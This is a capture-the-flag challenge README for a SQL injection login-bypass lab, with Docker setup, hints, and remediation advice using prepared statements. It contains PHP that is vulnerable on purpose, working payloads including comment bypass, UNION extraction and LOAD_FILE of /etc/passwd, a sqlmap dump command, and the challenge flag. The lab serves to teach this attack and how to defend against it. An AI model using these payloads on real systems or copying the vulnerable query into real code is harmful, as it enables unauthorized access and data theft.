# CTF Challenge #4 — Login Bypass (SQL Injection)

**Category:** Web | **Points:** 150 | **Difficulty:** 🟡 Medium

---

## Challenge Description

A login page is protecting a secret admin panel. Can you bypass authentication and retrieve the flag?

**Target:** `http://localhost:8080/login` (start the lab with `docker-compose up`)

---

## Hints

<details>
<summary>Hint 1 (−10 pts)</summary>
The login form has two fields: username and password. Try breaking the SQL query syntax.
</details>

<details>
<summary>Hint 2 (−25 pts)</summary>
SQL comments can be your friend. In MySQL, `--` comments out everything after it.
</details>

<details>
<summary>Hint 3 (−40 pts)</summary>
The backend query looks like: `SELECT * FROM users WHERE username='INPUT' AND password='INPUT'`
What happens if you close the string early?
</details>

---

## Lab Setup

```bash
cd ctf/web/login-bypass/
docker-compose up -d
# Visit http://localhost:8080/login
```

**docker-compose.yml:**
```yaml
version: '3'
services:
  web:
    image: php:8.0-apache
    volumes:
      - ./app:/var/www/html
    ports:
      - "8080:80"
  db:
    image: mysql:8.0
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: ctf_db
    volumes:
      - ./db/init.sql:/docker-entrypoint-initdb.d/init.sql
```

---

## Vulnerable Code

```php
// app/login.php — intentionally vulnerable
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) {
    echo "Welcome! The flag is: FLAG{sqli_byp4ss_4dm1n}";
} else {
    echo "Invalid credentials";
}
```

---

## Solution Walkthrough

### Step 1: Identify the injection point

Try a single quote in the username field:
```
Username: '
Password: test
```
If you get a MySQL error, the field is injectable.

### Step 2: Craft the bypass payload

The backend query:
```sql
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
```

Our payload in username: `admin'--`

The resulting query becomes:
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
```

The `--` comments out the password check entirely!

### Step 3: Submit the payload

```
Username: admin'--
Password: (anything)
```

✅ You're logged in as admin!

### Step 4: Advanced — UNION-based data extraction

```sql
-- Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← error means 2 columns

-- Extract data
' UNION SELECT username, password FROM users--

-- Read files (if FILE privilege granted)
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL--
```

### Automated with sqlmap

```bash
sqlmap -u "http://localhost:8080/login.php" \
       --data "username=admin&password=test" \
       --level=3 --risk=2 \
       --dbms=mysql \
       --dump
```

---

## The Flag

```
FLAG{sqli_byp4ss_4dm1n}
```

---

## Remediation

**Fix 1: Prepared Statements (best)**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

**Fix 2: Input validation**
```php
$username = preg_replace('/[^a-zA-Z0-9_]/', '', $username);
```

**Fix 3: Web Application Firewall (WAF)**
Deploy ModSecurity with OWASP Core Rule Set.

---

## Learning Points

- SQL injection is still the #3 most common web vulnerability (OWASP 2021)
- Never concatenate user input directly into SQL queries
- Prepared statements completely prevent SQLi
- Always implement defense in depth — validation + parameterized queries + WAF

---

*Next challenge: [#5 — Caesar's Secret](../crypto/caesars-secret/README.md)*
